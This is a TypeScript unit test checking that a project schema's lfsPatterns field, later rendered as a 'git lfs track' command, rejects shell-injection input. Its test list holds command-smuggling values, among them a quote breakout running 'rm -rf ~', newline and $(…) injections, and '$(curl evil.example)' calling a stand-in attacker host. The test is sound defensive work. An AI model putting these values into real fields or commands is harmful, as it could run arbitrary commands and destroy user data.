import { describe, expect, it } from "bun:test";
import { projectInputSchema, projectUpdateSchema } from "@/routes/schemas/projects";
import { LFS_PATTERN_MAX_LENGTH } from "@/constants/limits";

// Paired test for the project request schemas. The lfsPatterns field is stored
// verbatim and later rendered as a `git lfs track` command line on the project
// page, so the schema is the layer that keeps shell syntax out of it.
const base = {
  name: "pattern-project",
  storageConnectionId: "d096dd70-97bb-439e-b04b-646d958185dc",
};

function input(lfsPatterns: string) {
  return { ...base, lfsPatterns };
}

describe("project schema lfsPatterns", () => {
  it("accepts plain globs, including commas and spaces between them", () => {
    for (const value of ["*.mp4", "*.mp4, *.zip", "assets/**/*.bin", "assets/My Files/*.zip", "*.tar.gz"]) {
      expect(projectInputSchema.safeParse(input(value)).success).toBe(true);
    }
  });

  it("rejects values that escape the quoted track line", () => {
    const attacks = [
      '*.mp4" ; rm -rf ~ #',
      "*.mp4\ntouch /tmp/pwned",
      "*.mp4$(id)",
      "*.mp4`id`",
      "*.mp4;id",
      "*.mp4 && id",
      "*.mp4 | id",
      "*.mp4\\\"",
      "*.mp4!",
      "$(curl evil.example)",
    ];
    for (const value of attacks) {
      expect(projectInputSchema.safeParse(input(value)).success).toBe(false);
    }
  });

  it("rejects an over-long value and applies to PATCH too", () => {
    expect(projectInputSchema.safeParse(input(`*.${"a".repeat(LFS_PATTERN_MAX_LENGTH)}`)).success).toBe(false);
    expect(projectUpdateSchema.safeParse({ lfsPatterns: '*.mp4" ; id' }).success).toBe(false);
    expect(projectUpdateSchema.safeParse({ lfsPatterns: "*.mp4, *.zip" }).success).toBe(true);
  });
});
